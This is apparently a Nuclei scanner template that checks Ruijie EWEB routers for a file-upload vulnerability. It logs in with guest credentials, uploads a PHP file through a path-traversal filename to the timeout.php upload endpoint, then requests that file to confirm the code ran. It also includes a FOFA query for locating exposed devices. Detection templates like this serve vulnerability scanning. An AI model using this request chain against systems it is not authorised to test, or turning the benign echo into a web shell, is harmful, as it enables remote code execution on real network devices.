id: ruijie-route-timeout_upload-fileupload

info:
  name: ruijie-route-timeout_upload-fileupload
  author: HuanXiong
  severity: high
  description: 锐捷 EWEB路由器 timeout_upload 存在文件上传漏洞。
  tags: ruijie,fileupload
  metadata:
    fofa-query: title="锐捷网络-EWEB网管系统"

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /ddi/server/login.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Connection: keep-alive
        Content-Length: 30
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip, deflate, br

        username=guest&password=guest?

      - |
        POST /system_pi/timeout.php?a=upload HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
        Origin: http://{{Hostname}}
        Referer: http://{{Hostname}}/
        Accept-Encoding: gzip, deflate, br
        Cookie: RUIJIEID={{cookie}}; path=/; HttpOnly
        Accept-Language: zh-CN,zh;q=0.9
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 27

        fileName=../tmp/html/{{username}}.php&mes=<?php echo 23149147841;?>    

      - |
        GET /{{username}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36      

    extractors:
      - type: regex
        name: cookie
        part: header
        group: 1
        internal: true
        regex:
          - "RUIJIEID=(.*); path=/"
          
    matchers:
      - type: dsl
        dsl:
          - 'status_code_3==200 && contains(body_3, "23149147841")'